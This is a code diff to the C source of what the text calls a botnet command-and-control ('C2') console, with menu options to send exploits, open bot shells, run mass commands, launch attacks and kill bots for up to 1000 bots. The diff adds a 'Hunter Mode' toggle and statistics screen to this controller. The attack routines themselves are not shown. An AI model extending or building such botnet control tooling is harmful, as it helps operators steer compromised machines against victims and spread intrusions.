@@ -18,6 +18,7 @@
 #include <sys/ioctl.h>
 #include <termios.h>
 #include "config.h"
+#include "hunter_commands.h"
 
 #ifndef MAX_BOTS
 #define MAX_BOTS 1000
@@ -321,6 +322,7 @@ void print_dashboard() {
     printf("║ " BRIGHT_GREEN "[4]" RESET " Send Exploit    " BRIGHT_GREEN "[5]" RESET " Bot Shell       " BRIGHT_GREEN "[6]" RESET " Mass Command          ║\n");
     printf("║ " BRIGHT_GREEN "[7]" RESET " Show Stats      " BRIGHT_GREEN "[8]" RESET " Kill Bot        " BRIGHT_GREEN "[9]" RESET " Clear Screen          ║\n");
     printf("║ " BRIGHT_RED "[0]" RESET " Exit C2         " BRIGHT_YELLOW "[h]" RESET " Help            " BRIGHT_MAGENTA "[a]" RESET " ASCII Art             ║\n");
+    printf("║ " BRIGHT_YELLOW "[H]" RESET " Hunter Mode     " BRIGHT_CYAN "[S]" RESET " Hunter Stats                              ║\n");
     printf(BRIGHT_CYAN "╚════════════════════════════════════════════════════════════════════════════╝\n" RESET);
     
     printf("\n" BRIGHT_WHITE "Command" BRIGHT_CYAN " ►" RESET " ");
@@ -729,6 +731,17 @@ void *command_loop(void *arg) {
             cmd_launch_attack();
         } else if (strcmp(input, "a") == 0) {
             cmd_ascii_art();
+        } else if (strcmp(input, "H") == 0 || strcmp(input, "h") == 0) {
+            if (strcmp(input, "H") == 0) {
+                cmd_hunter_toggle();
+            } else {
+                // h = help (mantener comportamiento original)
+                printf(BRIGHT_CYAN "\nHelp: Use number commands or letters for special functions\n" RESET);
+                printf("Press Enter...");
+                getchar();
+            }
+        } else if (strcmp(input, "S") == 0) {
+            cmd_hunter_stats();
         } else if (strcmp(input, "0") == 0) {
             printf(BRIGHT_RED "\n👋 Shutting down C2...\n" RESET);
             exit(0);
